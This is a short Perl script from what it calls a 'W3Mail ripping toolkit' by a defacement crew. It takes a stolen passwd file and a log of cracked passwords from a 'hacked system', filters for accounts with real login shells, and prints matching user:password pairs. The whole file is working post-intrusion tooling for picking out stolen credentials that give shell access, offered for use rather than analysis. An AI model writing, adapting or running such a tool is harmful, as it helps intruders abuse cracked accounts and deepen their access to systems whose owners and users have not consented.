#!/usr/bin/perl

#     defaced staff private warez
#    W3Mail ripping toolkit v 1.0.9_full
#      < w3mail-chksh.pl - check shell access >
#
#  this ware shows wich users have real shells on hacked system

if ($#ARGV < 0)
{
  print "\tw3mail-chksh v 1.00\n";
  print "usage: $0 <datadir>\n\n";
  exit;
}

$datadir = $ARGV[0];

print "[+] use $datadir datadir\n";

open(POWN, "<bases/${datadir}/000_LOGFILE");
@cracked = <POWN>;
close(POWN);

open(PASS, "<bases/${datadir}/000_PASSWD");
@pwdf = <PASS>;
close(PASS);

print "[+] got $#cracked passwordz and $#pwdf users\n";

foreach $line (@pwdf)
{
  chomp $line;

  @infa = split(/:/, $line);

  # user:x:uid:gid:infaz :home:shell
  if ($infa[6] =~ m/nologin/ || $infa[6] =~ m/false/){ next; }

  foreach $k (@cracked)
  {
    chomp $k;

    if ($k =~ m/\x3a/)
    {
      $k =~ s/ //g; # kill spaces
      ($t, $user, $pwd) = split(/:/, $k);

      if ($user =~ m/$infa[0]/i) # yeah we got a winner!!
      {
        print "$user:$pwd \@ $infa[6]\n";
        last;
      }
    }
  }
}

print "press any key\n";
$a = <>;
